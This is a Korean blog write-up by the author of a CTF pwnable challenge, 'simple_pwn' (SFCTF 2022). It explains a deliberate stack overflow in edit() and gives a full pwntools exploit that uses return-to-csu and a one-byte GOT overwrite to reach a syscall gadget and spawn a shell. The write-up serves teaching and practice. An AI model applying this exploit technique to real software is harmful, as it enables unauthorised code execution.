---
layout: post
title: SFCTF 2022 Winter - simple_pwn
date: 2022-02-15 21:06:00 +0900
categories: [Security, CTF]
tags: [security factorial, pwnable, return2csu, sfctf]
---


![simple_pwn 바이너리 보호기법 확인](0215-SFCTF-simplePwn-writeup/img1.png)

보호 기법이 약하게 걸려 있다. PIE가 안 걸려 있고, canary도 없다.  
partial RELRO 상태이기 때문에, GOT overwrite도 할 수는 있다.  
위 바이너리는 https://github.com/brwook/binary에서 다운로드할 수 있다.

---
## 문제 분석
Dreamhack의 시스템 해킹 강의 중에서 Type Error 강의를 듣다가 만들어진 문제이다. malloc에는 size+1을 인자로 할당하고, read는 size만큼 입력을 할 수 있는 코드였는데, size의 자료형이 int였으면 아주 쉽게 -1을 입력하면, 버퍼 오버플로우가 발생할 것을 예측할 수 있었을 것이다. 그러나, size가 unsigned int였기 때문에, -1을 입력할 수 있을 거란 생각이 전혀 들지 않았다. 그리고, 강의에서 설명하길 4294967295이라는 unsigned int의 최댓값을 입력하면, 같은 작용이 발생한다는 것에 사소한 변화지만 뒤통수를 좀 세게 맞은 듯한 느낌이 들어서, 이를 공유하고 싶어 문제로 만들었다.

아래는 simple_pwn에서 제공하는 4개의 기능(add, view, edit, delete) 중 add에 해당하는 부분이다.

```c
struct chunk
{
    int idx;
    unsigned size;
    char *msg;
    struct chunk *prev;
};
struct chunk *HEAD;

void add()
{
    unsigned long long size;
    long long read_size;
    char buf[0x100];

    ...

    printf("size > ");
    size = read_int();
    if(size > 0x100)
    {
        puts("[*] size error");
        return;
    }

    printf("msg > ");
    read_size = read(0, buf, size);
    buf[read_size] = '\0';

    struct chunk *ptr = (struct chunk *)malloc(sizeof(struct chunk));
    if(!ptr)
    {
        puts("[*] malloc error");
        return;
    }

    ptr->idx = i;
    ptr->size = read_size;

    s_msg = (char *)malloc(read_size);
    if(!s_msg)
    {
        puts("[*] malloc error");
        return;
    }

	...
}
```
최대 0x100만큼 스택 버퍼에 작성을 한 뒤에, 실제 작성한 바이트만큼만 힙으로 할당해 저장한다는, 나름 메모리를 아낀다는 컨셉으로 '어쩔 수 없이' 스택을 사용해야 했다...라는 연유를 만들어 주려고 했다. 또한, 한 가지 함수에서, 특히, 새로운 힙의 size를 입력하는 부분에서 바로 취약점을 보여주긴 싫었다. 일단, 0부터 0x100까지 원하는 크기의 힙 청크를 할당할 수 있다는 것에 주목하자.

```c
void edit()
{
    long long i;
    struct chunk *ptr;
    char buf[0x100];
	
    ...
	
    unsigned long long int read_size = read(0, buf, ptr->size - 1);
    buf[read_size - 1] = '\0';
    ptr->size = read_size;
    memcpy(ptr->msg, buf, read_size);
}
```
정말 취약점이 터지는 부분은 edit 함수이다. 굳이... 기존 메시지의 size에서 1을 뺀 크기를, 굳이... 스택에 위치한 buf에 쓴 다음에 이를 다시 힙에 복사한다.

즉, ptr->size가 0이면, 스택 버퍼 오버플로우가 발생하고, canary도 존재하지 않기 때문에 RIP 조작이 가능하다.

그런데, 여기서 canary가 존재할 수가 없는 이유가 하나 있었는데,

그것은 바로, 출력 스트림을 해제했기 때문이다.

![close(1)](0215-SFCTF-simplePwn-writeup/img2.png)

sub_400C24는 while 반복문 이전에 main 함수에서 가장 먼저 호출되는 함수인데, 위 함수를 보면 close(1)이 되어 있기 때문에, 바로 아래에서 puts 함수로 문자열을 출력해도, 사용자는 이를 읽을 수 없다. 이 때문에 올바른 문제 풀이(stack BOF)로 가려면, canary가 세팅되어 있으면 안 됐다.

그렇다면 이는 어떻게 해결할까?

다시 말해, 출력이 안 되면, libc 주소는 어떻게 얻으며, 쉘은 어떻게 딸까?

여기서 내 나름대로 힌트를 남겼는데, "Simple ROP problem"에서 대문자만 따면 SROP이다. 그리고, 시스템 해킹 공격 기법 중에 하나로 Sigreturn Oriented Programming이 있다. 이걸 살짝 공부해 보면, syscall을 호출해서 쉘을 딸 수 있다는 것을 알 수 있다.

그러면, 다시 또 문제가 발생하는데, syscall은 어디에서 얻느냐?

여기서 Partial RELRO 보호 기법을 다시 살펴볼 필요가 있다. 즉, GOT overwrite가 가능하다. 우리는 libc leak을 할 수 없으므로, system 함수를 통째로 덮을 수는 없다. 그러나, 하위 1바이트는 덮어서 원하는 기능을 하도록 만들 수는 있다.

libc가 메모리에 할당될 때는, 페이지 단위(0x1000)로 이뤄진다. 따라서, 하위 2바이트까지 수정하면, 0x10번 중 1번으로 오차가 생길 수 있지만, 1바이트만큼 수정하는 것은 해당 함수를 기준으로 원하는 명령을 실행하도록 수정할 수 있다.

정리하자면, **GOT overwrite**를 통해, 특정 함수의 1바이트를 수정해서 **syscall gadget**으로 만들 수 있다면, libc leak을 하지 않고도 쉘을 딸 수 있을 것이다.

## 익스플로잇
![sleep 함수 근처](0215-SFCTF-simplePwn-writeup/img3.png)

sleep 함수의 바로 위에는 __waitid라는 함수가 존재한다. 그 속에 syscall도 함께 들어있는데, 이를 활용하였다.  
즉, sleep_got(0x602070)의 하위 1바이트를 0x3E로 바꾼다면, syscall을 호출할 수 있게 된다.

또한, PIE가 걸려 있지 않기 때문에, 바이너리 코드를 원하는대로 이용할 수 있는데, 그중에서도 csu 가젯을 이용하면, 원하는 함수 호출이 가능하다. 관련된 정보는 구글에 "return to csu"라고 검색하면 여러 정보를 얻을 수 있을 것이다.

그래도 살짝 설명하자면, csu는 바이너리가 실행되는 과정에 있는 여러 함수 중 하나이며, 이를 이용하면 ROP를 할 때, 큰 도움을 받을 수 있다.


```python
from pwn import *

def ss(s):
	sleep(0.1);
	p.send(s)

def add(idx, size):
	ss('1')
	ss(str(idx))
	ss(str(size))

def csu(first, second, third, func, toggle=0):
    if(toggle):
        pl = p64(init_csu)
        pl += p64(0)*2		# rbx = 0
        pl += p64(1)
        pl += p64(func)		# r12
        pl += p64(third)	# r13
        pl += p64(second)	# r14
        pl += p64(first)	# r15
        pl += p64(chain_csu)

    else:
        pl = b"a"*8
        pl += p64(0)
        pl += p64(1)
        pl += p64(func)
        pl += p64(third)
        pl += p64(second)
        pl += p64(first)
        pl += p64(chain_csu)
    return pl

p = process('./simple_pwn', env={"LD_PRELOAD":"./libc-2.23.so"})
init_csu = 0x400D56
chain_csu = 0x400D40
sleep_got = 0x602070
read_got = 0x602040
bss = 0x602500

sleep(3)
add(1, 0)

ss('3')
ss('1')
payload = 'A'*0x108
payload += p64(0) + p64(0) + p64(0x6020b0 - 8)
payload += p64(bss)
payload += csu(0, sleep_got, 1, read_got, 1)
payload += csu(0, bss, 0x3b, read_got)
payload += csu(bss, 0, 0, sleep_got)
ss(payload)
ss('\x3e')

payload2 = ''
payload2 += '/bin/sh\x00'
payload2 += 'A'*(0x3b-len(payload2))
ss(payload2)
sleep(0.1)
p.sendline("sh 1>&2")

p.interactive()
```
csu 함수의 1, 2, 3번째 인자는 함수의 인자(rdi, rsi, rdx)를 의미하고, 4번째 인자는 참조해서 사용할 함수의 주소를 의미한다. 즉, read(0, sleep_got, 1); read(0, bss, 0x3b); sleep(bss, 0, 0);의 순서로 실행된다고 보면 된다.

여기서 굳이 "/bin/sh"만 입력하고 끝나는 것이 아니라, 0x3B만큼 꽉 채워서 입력을 마치는 이유는 read 함수의 반환 값(읽기 성공한 바이트수)이 rax 레지스터에 담기기 때문이고, 우리는 syscall(sleep_got)로 익스를 할 것이기 때문에, rax를 0x3b로 맞춰서 execve syscall을 호출할 것이기 때문이다. (x86-64 linux 기준)

![쉘을 땄는데 아무것도 안 뜬다!](0215-SFCTF-simplePwn-writeup/img4.png)

익스플로잇 코드의 맨 아래에 p.sendline("sh 1>&2")가 있는 이유는 바로 이 때문이다. 쉘을 실행시켜도, 원래 프로세스가 close(1) 되어 있기 때문에, 입력한 것이 쉘에서 실행은 되지만, 결국 아무런 출력도 가져올 수 없다!

이때, 사용되는 것이 1>&2인데, 이는 stdout(1) stream을 stderr(2) stream으로 리다이렉트하여 사용한다는 뜻이다.  
원래는 2>&1 처럼, 에러 메시지를 출력해서 보려고 활용했던 적이 있는 것 같은데, 더 자세한 정보는 스택오버플로우를 참조하면 좋을 것 같다.

어쨌든, "sh 1>&2"로 stdout을 stderr로 돌려서 쉘을 새로 열고나면, 출력을 확인할 수 있게 된다.

![예에에에](0215-SFCTF-simplePwn-writeup/img5.png)

